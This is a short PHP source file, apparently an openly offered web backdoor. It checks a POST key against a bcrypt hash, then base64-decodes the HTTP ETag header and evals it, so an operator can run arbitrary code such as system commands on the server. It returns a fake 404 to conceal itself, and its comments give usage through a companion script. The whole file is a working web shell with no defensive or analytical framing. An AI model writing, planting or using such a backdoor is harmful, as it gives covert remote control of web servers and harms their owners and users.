<?php
// Author:xubzero
// Description : This is a simple php backdoor that accepts a base64 encoded php line using the etag header,decodes it and evals it. :)
// 		The key must be correct 
// 		Use the usebackdoor.py file to send raw php lines to the backdoor using the synax below
//			Usage : python3 usebackdoor.py http://localhost/tests/c0ntacts.php "system(\'ls -al\')"


if (isset($_POST['key'])){
	$stored_key='$2y$10$ecmnD4sNd/4Y5XOITeTcvOQlG.zzaZjV9vQTEEsTJEZYhsXeOoQh2'; /*This key can be changed*/
	$key=($_POST['key']);
	if((password_verify($key,$stored_key)) == 1){
		$command=base64_decode((getallheaders()['etag']));
		print_r(@eval($command));
	}else{

		header("HTTP/1.0 404 Not Found");
		echo 'Error 404';

	}
	
}else{


		header("HTTP/1.0 404 Not Found");
		echo 'Error 404';


}

?>